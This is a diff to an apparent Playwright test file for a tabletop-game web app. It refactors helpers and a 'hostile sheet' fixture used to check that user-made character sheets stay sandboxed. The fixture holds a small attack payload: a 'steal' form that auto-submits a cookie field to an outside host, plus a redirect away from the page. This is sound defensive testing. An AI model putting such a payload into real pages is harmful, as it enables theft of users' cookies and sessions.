@@ -1,49 +1,21 @@
 import { expect, type FrameLocator, type Locator, type Page } from '@playwright/test';
-import { BIA, CAIO } from './support/dev-players';
 import { test } from './support/player-pages';
 import {
-  campaignIdOf,
   createStarterTemplate,
   createTemplateByApi,
   newSheetOnToken,
   openSheetFromCard,
+  openSheetTable,
   patchSheetValues,
   readSheet,
   setSheetVisibility,
   sheetButtonOf,
   sheetRegionOf,
   sheetTabOf,
+  sheetFilesOf,
   type SheetSourceCode,
 } from './support/sheets';
-import { adminCredentials, signIn } from './support/sign-in';
-import { createTableAndReadCode, enterFromTheList, joinByCodeAndEnter } from './support/tables';
-import { cardOf, createCharacterTokenWithPv, openCard } from './support/token-cards';
-
-type SheetTable = Readonly<{ admin: Page; bia: Page; caio: Page | null; campaignId: string }>;
-
-/** Ana's table with Bia (and Caio, when asked) as players, and Bia's character Lyra (PV 10 / 10)
- *  on a token at the center cell: a sheet made on the linked token is the character's, so the
- *  card lists it (a sheet on an unlinked token never shows there). Everyone in the room. */
-async function openSheetTable(
-  newPlayerPage: () => Promise<Page>,
-  withCaio: boolean,
-): Promise<SheetTable> {
-  const name = `Mesa fichas ${Date.now()}`;
-  const admin = await newPlayerPage();
-  const bia = await newPlayerPage();
-  await signIn(admin, adminCredentials());
-  const code = await createTableAndReadCode(admin, name);
-  await signIn(bia, BIA);
-  await joinByCodeAndEnter(bia, code, admin);
-  const caio = withCaio ? await newPlayerPage() : null;
-  if (caio !== null) {
-    await signIn(caio, CAIO);
-    await joinByCodeAndEnter(caio, code, admin);
-  }
-  await enterFromTheList(admin, name);
-  await createCharacterTokenWithPv(admin, 'Lyra', 'Bia');
-  return { admin, bia, caio, campaignId: campaignIdOf(admin) };
-}
+import { cardOf, openCard } from './support/token-cards';
 
 function historyOf(page: Page): Locator {
   return page.getByRole('list', { name: 'Histórico de rolagens' }).getByRole('listitem');
@@ -147,10 +119,11 @@ const APP_COOKIE = 'lorkarium-probe=app-secret';
 // writes its outcome into the frame's own page, read back through the frame locator.
 const HOSTILE_SHEET: SheetSourceCode = {
   name: 'Ficha hostil',
-  html: `<form id="steal" action="${OUTSIDE}/form" method="get"><input name="cookie" value="x"></form>
+  files: sheetFilesOf(
+    `<form id="steal" action="${OUTSIDE}/form" method="get"><input name="cookie" value="x"></form>
 <button id="leave" type="button">Sair da ficha</button>`,
-  css: '',
-  js: `function report(probe, outcome) {
+    '',
+    `function report(probe, outcome) {
   const line = document.createElement('p');
   line.dataset.probe = probe;
   line.textContent = String(outcome);
@@ -181,6 +154,7 @@ document.getElementById('steal').submit();
 setTimeout(() => report('form', 'still-here'), 500);
 document.getElementById('leave').addEventListener('click', () => { location = OUTSIDE + '/self'; });
 lorkarium.ready().then(() => report('sdk', 'ready'), (e) => report('sdk', e.name));`,
+  ),
 };
 
 const HOSTILE_OUTCOMES: Readonly<Record<string, readonly string[]>> = {
